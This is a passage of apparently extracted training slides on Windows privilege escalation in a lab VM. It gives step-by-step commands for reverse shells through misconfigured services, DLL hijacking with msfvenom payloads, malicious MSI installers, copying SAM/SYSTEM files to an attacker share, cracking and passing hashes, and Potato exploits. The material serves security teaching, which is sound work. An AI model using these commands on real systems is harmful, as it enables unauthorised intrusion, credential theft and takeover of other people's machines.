<br>Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,
<br>
<br>SERVICE_ALL_ACCESS)
<br>
<br>
<br>
<br>50
<br>Insecure Service Permissions
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
<br>
<br>Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
<br>
<br>
<br>51
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Run winPEAS to check for service misconfigurations:
<br>        ◦ .\winPEASany.exe quiet servicesinfo
<br>
<br>    2. Note that we can modify the “daclsvc” service.
<br>
<br>    3. We can confirm this with accesschk.exe:
<br>        ◦ .\accesschk.exe /accepteula -uwcqv user daclsvc
<br>
<br>    4. Check the current configuration of the service:
<br>        ◦ sc qc daclsvc
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>52
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    5. Check the current status of the service:
<br>        ◦ sc query daclsvc
<br>
<br>    6. Reconfigure the service to use our reverse shell executable:
<br>        ◦ sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
<br>
<br>    7. Start a listener on Kali, and then start the service to trigger the exploit:
<br>
<br>        ◦ net start daclsvc
<br>
<br>
<br>
<br>53
<br>Unquoted Service Path
<br>
<br>
<br>
<br>
<br>
<br>
<br>Executables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”).
<br>
<br>Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3…
<br>
<br>This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.
<br>
<br>
<br>54
<br>Unquoted Service Path
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Consider the following unquoted path:
<br>
<br>C:\Program Files\Some Dir\SomeProgram.exe
<br>
<br>To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”
<br>
<br>Windows resolves this ambiguity by checking each of the possibilities in turn.
<br>
<br>If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.
<br>
<br>
<br>
<br>55
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Run winPEAS to check for service misconfigurations:
<br>        ◦ .\winPEASany.exe quiet servicesinfo
<br>
<br>    2. Note that the “unquotedsvc” service has an unquoted path that also contains spaces:
<br>
<br>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
<br>
<br>    3. Confirm this using sc:
<br>        ◦ sc qc unquotedsvc
<br>
<br>
<br>
<br>56
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. Use accesschk.exe to check for write permissions:
<br>        ◦ .\accesschk.exe /accepteula -uwdq C:\
<br>
<br>        ◦ .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
<br>
<br>        ◦ .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
<br>
<br>    5. Copy the reverse shell executable and rename it appropriately:
<br>        ◦ copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
<br>
<br>    6. Start a listener on Kali, and then start the service to trigger the exploit:
<br>        ◦ net start unquotedsvc
<br>
<br>
<br>
<br>
<br>
<br>
<br>57
<br>Weak Registry Permissions
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.
<br>
<br>
<br>
<br>
<br>58
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Run winPEAS to check for service misconfigurations:
<br>        ◦ .\winPEASany.exe quiet servicesinfo
<br>
<br>    2. Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:
<br>
<br>PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
<br>
<br>    3. Alternatively accesschk.exe can be used to confirm:
<br>        ◦ .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
<br>
<br>59
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. Overwrite the ImagePath registry key to point to our reverse shell executable:
<br>
<br>        ◦ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
<br>
<br>    5. Start a listener on Kali, and then start the service to trigger the exploit:
<br>        ◦ net start regsvc
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>60
<br>Insecure Service Executables
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.
<br>
<br>Remember to create a backup of the original executable if you are exploiting this in a real system!
<br>
<br>
<br>
<br>
<br>61
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Run winPEAS to check for service misconfigurations:
<br>        ◦ .\winPEASany.exe quiet servicesinfo
<br>
<br>    2. Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:
<br>
<br>        ◦ .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
<br>
<br>    3. Create a backup of the original service executable:
<br>        ◦ copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
<br>
<br>
<br>
<br>
<br>62
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. Copy the reverse shell executable to overwrite the service executable:
<br>
<br>        ◦ copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
<br>
<br>    5. Start a listener on Kali, and then start the service to trigger the exploit:
<br>
<br>        ◦ net start filepermsvc
<br>
<br>
<br>
<br>
<br>63
<br>DLL Hijacking
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it.
<br>
<br>If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.
<br>
<br>
<br>64
<br>DLL Hijacking
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in.
<br>
<br>Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.
<br>
<br>
<br>65
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use winPEAS to enumerate non-Windows services:
<br>        ◦ .\winPEASany.exe quiet servicesinfo
<br>
<br>    2. Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
<br>
<br>        ◦ .\accesschk.exe /accepteula -uvqc user dllsvc
<br>
<br>    3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:
<br>
<br>        ◦ sc qc dllsvc
<br>
<br>
<br>
<br>66
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
<br>
<br>    5. Add a new filter on the Process Name matching dllhijackservice.exe.
<br>
<br>    6. On the main screen, deselect registry activity and network activity.
<br>
<br>
<br>
<br>67
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    7. Start the service:
<br>> net start dllsvc
<br>
<br>
<br>    8. Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the hijackme.dll file.
<br>
<br>    9. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.
<br>
<br>
<br>
<br>
<br>
<br>68
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    10. On Kali, generate a reverse shell DLL named hijackme.dll:
<br>
<br># msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
<br>
<br>    11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
<br>
<br>listener on Kali and then stop/start the service to trigger the exploit:
<br>
<br>> net stop dllsvc > net start dllsvc
<br>
<br>69
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Registry
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>70
<br>AutoRuns
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows can be configured to run commands at startup, with elevated privileges.
<br>
<br>These “AutoRuns” are configured in the Registry.
<br>
<br>If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
<br>
<br>
<br>
<br>71
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use winPEAS to check for writable AutoRun executables:
<br>
<br>        ◦ .\winPEASany.exe quiet applicationsinfo
<br>
<br>
<br>    2. Alternatively, we could manually enumerate the AutoRun executables:
<br>
<br>        ◦ reg query
<br>
<br>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
<br>
<br>and then use accesschk.exe to verify the permissions on each one:
<br>
<br>    • .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
<br>
<br>72
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
<br>
<br>        ◦ copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
<br>
<br>
<br>    4. Copy our reverse shell executable to overwrite the AutoRun executable:
<br>
<br>        ◦ copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
<br>
<br>    5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.
<br>
<br>
<br>
<br>
<br>73
<br>AlwaysInstallElevated
<br>
<br>
<br>
<br>
<br>
<br>
<br>MSI files are package files used to install applications.
<br>
<br>These files run with the permissions of the user trying to install them.
<br>
<br>Windows allows for these installers to be run with elevated (i.e.
<br>
<br>admin) privileges.
<br>
<br>If this is the case, we can generate a malicious MSI file which contains a reverse shell.
<br>
<br>
<br>
<br>74
<br>AlwaysInstallElevated
<br>
<br>
<br>
<br>
<br>
<br>
<br>The catch is that two Registry settings must be enabled for this to work.
<br>
<br>The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
<br>
<br>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
<br>
<br>and the current user:
<br>
<br>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
<br>
<br>If either of these are missing or disabled, the exploit will not work.
<br>
<br>
<br>
<br>75
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use winPEAS to see if both registry values are set:
<br>        ◦ .\winPEASany.exe quiet windowscreds
<br>
<br>    2. Alternatively, verify the values manually:
<br>        ◦ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
<br>        ◦ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
<br>
<br>
<br>
<br>76
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
<br>
<br># msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
<br>
<br>    4. Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
<br>
<br>> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>77
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Passwords
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>78
<br>Passwords?
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Yes, passwords.
<br>
<br>Even administrators re-use their passwords, or leave their passwords on systems in readable locations.
<br>
<br>Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.
<br>
<br>
<br>
<br>79
<br>Registry
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Plenty of programs store configuration options in the Windows Registry.
<br>
<br>Windows itself sometimes will store passwords in plaintext in the Registry.
<br>
<br>It is always worth searching the Registry for passwords.
<br>
<br>
<br>
<br>
<br>80
<br>Searching the Registry for Passwords
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The following commands will search the registry for keys and values that contain “password”
<br>
<br>    • reg query HKLM /f password /t REG_SZ /s
<br>
<br>    • reg query HKCU /f password /t REG_SZ /s
<br>
<br>This usually generates a lot of results, so often it is more fruitful to look in known locations.
<br>
<br>
<br>
<br>81
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use winPEAS to check common password locations:
<br>> .\winPEASany.exe quiet filesinfo userinfo
<br>(the final checks will take a long time to complete)
<br>
<br>    2. The results show both AutoLogon credentials and Putty session credentials for the admin user (admin/password123).
<br>
<br>
<br>
<br>82
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. We can verify these manually:
<br>        ◦ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
<br>        ◦ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
<br>
<br>    4. On Kali, we can use the winexe command to spawn a shell using these credentials:
<br>
<br># winexe -U 'admin%password123' //192.168.1.22 cmd.exe
<br>
<br>
<br>83
<br>Saved Creds
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows has a runas command which allows users to run commands with the privileges of other users.
<br>
<br>This usually requires the knowledge of the other user’s password.
<br>
<br>However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.
<br>
<br>
<br>84
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use winPEAS to check for saved credentials:
<br>        ◦ .\winPEASany.exe quiet cmd windowscreds
<br>
<br>    2. It appears that saved credentials for the admin user exist.
<br>
<br>    3. We can verify this manually using the following command:
<br>
<br>        ◦ cmdkey /list
<br>
<br>
<br>
<br>
<br>
<br>
<br>85
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. If the saved credentials aren’t present, run the following script to refresh the credential:
<br>
<br>        ◦ C:\PrivEsc\savecred.bat
<br>
<br>    5. We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
<br>
<br>        ◦ runas /savecred /user:admin C:\PrivEsc\reverse.exe
<br>
<br>
<br>
<br>
<br>
<br>
<br>86
<br>Configuration Files
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Some administrators will leave configurations files on the system with passwords in them.
<br>
<br>The Unattend.xml file is an example of this.
<br>
<br>
<br>It allows for the largely automated setup of Windows systems.
<br>
<br>
<br>
<br>87
<br>Searching for Configuration Files
<br>
<br>
<br>
<br>
<br>
<br>
<br>Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
<br>
<br>> dir /s *pass* == *.config
<br>
<br>Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
<br>
<br>> findstr /si password *.xml *.ini *.txt
<br>
<br>
<br>
<br>88
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use winPEAS to search for common files which may contain credentials:
<br>
<br>        ◦ .\winPEASany.exe quiet cmd searchfast filesinfo
<br>    2. The Unattend.xml file was found. View the contents:
<br>
<br>        ◦ type C:\Windows\Panther\Unattend.xml
<br>
<br>
<br>
<br>89
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. A password for the admin user was found. The password is Base64 encoded: cGFzc3dvcmQxMjM=
<br>
<br>    4. On Kali we can easily decode this:
<br>
<br># echo "cGFzc3dvcmQxMjM=" | base64 -d
<br>
<br>
<br>    5. Once again we can simply use winexe to spawn a shell as the admin user.
<br>
<br>
<br>
<br>90
<br>SAM
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows stores password hashes in the Security Account Manager (SAM).
<br>
<br>The hashes are encrypted with a key which can be found in a file named SYSTEM.
<br>
<br>If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.
<br>
<br>
<br>
<br>91
<br>SAM/SYSTEM Locations
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.
<br>
<br>The files are locked while Windows is running.
<br>
<br>
<br>Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.
<br>
<br>
<br>
<br>92
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Backups of the SAM and SYSTEM files can be found in C:\Windows\Repair and are readable by our user.
<br>
<br>    2. Copy the files back to Kali:
<br>        ◦ copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
<br>        ◦ copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
<br>
<br>
<br>93
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. Download the latest version of the creddump suite:
<br>        ◦ git clone https://github.com/Neohapsis/creddump7.git
<br>
<br>    4. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
<br>        ◦ python2 creddump7/pwdump.py SYSTEM SAM
<br>
<br>    5. Crack the admin user hash using hashcat:
<br>        ◦ hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>94
<br>Passing the Hash
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows accepts hashes instead of passwords to authenticate to a number of services.
<br>
<br>We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>95
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Extract the admin hash from the SAM in the previous step.
<br>
<br>    2. Use the hash with pth-winexe to spawn a command prompt:
<br>        ◦ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c 4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
<br>
<br>    3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
<br>        ◦ pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c 4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
<br>
<br>
<br>96
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Scheduled
<br>Tasks
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>97
<br>Scheduled Tasks
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon).
<br>
<br>Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.
<br>
<br>
<br>98
<br>Commands
<br>
<br>
<br>
<br>
<br>
<br>
<br>Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.
<br>
<br>List all scheduled tasks your user can see:
<br>    • schtasks /query /fo LIST /v
<br>
<br>In PowerShell:
<br>
<br>PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
<br>
<br>Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
<br>
<br>
<br>
<br>99
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. In the C:\DevTools directory, there is a PowerShell script called “CleanUp.ps1”. View the script:
<br>
<br>        ◦ type C:\DevTools\CleanUp.ps1
<br>
<br>    2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
<br>
<br>        ◦ C:\PrivEsc\accesschk.exe /accepteula -quvw user
<br>
<br>C:\DevTools\CleanUp.ps1
<br>
<br>It appears we have the ability to write to this file.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>100
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. Backup the script:
<br>        ◦ copy C:\DevTools\CleanUp.ps1 C:\Temp\
<br>
<br>    4. Start a listener on Kali.
<br>
<br>    5. Use echo to append a call to our reverse shell executable to the end of the script:
<br>
<br>        ◦ echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
<br>
<br>    6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>101
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Insecure GUI
<br>Apps (Citrix
<br>
<br>Method)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>102
<br>Insecure GUI Apps
<br>
<br>
<br>
<br>
<br>
<br>
<br>On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges.
<br>
<br>There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.
<br>
<br>Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.
<br>
<br>I call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.
<br>
<br>
<br>103
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Log into the Windows VM using the GUI with the “user” account.
<br>
<br>    2. Double click on the “AdminPaint” shortcut on the Desktop.
<br>
<br>    3. Open a command prompt and run:
<br>> tasklist /V | findstr mspaint.exe
<br>
<br>Note that mspaint.exe is running with admin privileges.
<br>
<br>
<br>104
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. In Paint, click File, then Open.
<br>
<br>    5. In the navigation input, replace the contents with: file://c:/windows/system32/cmd.exe
<br>
<br>    6. Press Enter. A command prompt should open running with admin privileges.
<br>
<br>
<br>
<br>105
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Startup
<br>Apps
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>106
<br>Startup Apps
<br>
<br>
<br>
<br>
<br>
<br>
<br>Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.
<br>
<br>Windows also has a startup directory for apps that should start for all users:
<br>
<br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
<br>
<br>If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.
<br>
<br>
<br>
<br>
<br>
<br>107
<br>Startup Apps
<br>
<br>
<br>
<br>
<br>
<br>
<br>Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file:
<br>
<br>
<br>Set oWS = WScript.CreateObject("WScript.Shell") sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
<br>
<br>Set oLink = oWS.CreateShortcut(sLinkFile) oLink.TargetPath = "C:\PrivEsc\reverse.exe" oLink.Save
<br>
<br>
<br>
<br>
<br>108
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. Use accesschk.exe to check permissions on the StartUp directory:
<br>
<br>> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Star t Menu\Programs\StartUp"
<br>
<br>    2. Note that the BUILTIN\Users group has write access to this directory.
<br>
<br>
<br>
<br>109
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    3. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
<br>
<br>    4. Run the script using cscript:
<br>> cscript CreateShortcut.vbs
<br>
<br>    5. Start a listener on Kali, then log in as the admin user to trigger the exploit.
<br>
<br>
<br>110
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Installed
<br>Applications
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>111
<br>Installed Applications
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Most privilege escalations relating to installed applications are based on misconfigurations we have already covered.
<br>
<br>Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.
<br>
<br>
<br>112
<br>Commands
<br>
<br>
<br>
<br>
<br>
<br>
<br>Manually enumerate all running programs:
<br>> tasklist /v
<br>
<br>We can also use Seatbelt to search for nonstandard processes:
<br>
<br>> .\seatbelt.exe NonstandardProcesses
<br>
<br>winPEAS also has this ability (note the misspelling):
<br>> .\winPEASany.exe quiet procesinfo
<br>
<br>
<br>113
<br>Exploit-DB
<br>
<br>
<br>
<br>
<br>
<br>
<br>Once you find an interesting process, try to identify its version. You can try running the executable with /? or -h, as well as checking config or text files in the Program Files directory.
<br>
<br>Use Exploit-DB to search for a corresponding exploit.
<br>
<br>Some exploits contain instructions, while others are code that you will need to compile and run.
<br>
<br>
<br>114
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Hot Potato
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>115
<br>Hot Potato
<br>
<br>
<br>
<br>
<br>
<br>
<br>Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges.
<br>
<br>The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.
<br>
<br>This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
<br>
<br>
<br>
<br>
<br>116
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>(Note: These steps are for Windows 7)
<br>
<br>    1. Copy the potato.exe exploit executable over to Windows.
<br>
<br>    2. Start a listener on Kali.
<br>
<br>    3. Run the exploit:
<br>
<br>.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true
<br>
<br>    4. Wait for a Windows Defender update, or trigger one manually.
<br>
<br>
<br>
<br>
<br>117
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Service
<br>Accounts
<br>(Rotten / Juicy
<br>
<br>Potato)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>118
<br>Service Accounts
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>We briefly talked about service accounts at the start of the course.
<br>
<br>Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly.
<br>
<br>Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.
<br>
<br>
<br>
<br>
<br>
<br>119
<br>Rotten Potato
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The original Rotten Potato exploit was identified in 2016.
<br>
<br>Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.
<br>
<br>This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled.
<br>
<br>
<br>
<br>
<br>
<br>
<br>120
<br>Juicy Potato
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Rotten Potato was quite a limited exploit.
<br>
<br>Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.
<br>
<br>https://github.com/ohpe/juicy-potato
<br>
<br>
<br>
<br>
<br>121
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>(Note: These steps are for Windows 7)
<br>
<br>    1. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.
<br>
<br>    2. Start a listener on Kali.
<br>
<br>    3. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
<br>
<br>> C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
<br>
<br>
<br>
<br>
<br>122
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    4. Start another listener on Kali.
<br>
<br>    5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
<br>
<br>> C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
<br>
<br>    6. If the CLSID ({03ca…) doesn’t work for you, either check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md or run the GetCLSID.ps1 PowerShell script.
<br>
<br>
<br>
<br>123
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Port
<br>Forwarding
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>124
<br>Port Forwarding
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port.
<br>
<br>In these cases we need to forward a port on Kali to the internal port on Windows.
<br>
<br>We can do this using a program called plink.exe (from the makers of PuTTY).
<br>
<br>
<br>
